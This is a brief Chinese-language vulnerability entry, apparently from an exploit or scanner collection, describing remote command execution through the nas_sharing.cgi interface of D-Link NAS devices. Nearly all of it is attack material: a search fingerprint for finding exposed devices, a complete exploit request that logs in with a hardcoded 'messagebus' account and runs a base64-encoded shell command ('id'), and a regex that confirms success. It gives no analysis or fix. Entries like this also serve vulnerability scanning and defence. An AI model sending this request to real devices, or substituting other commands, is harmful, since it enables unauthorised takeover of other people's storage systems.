# D-LinkNAS设备nas_sharing.cgi接口远程命令执行漏洞

D-LinkNAS ｜ 命令执行 ｜ —
- **指纹**：`body="Text:In order to access the ShareCenter"`
- **请求**：`GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= HTTP/1.1`
- **响应特征**：200 ^(?=.*?uid)(?=.*?gid).*?$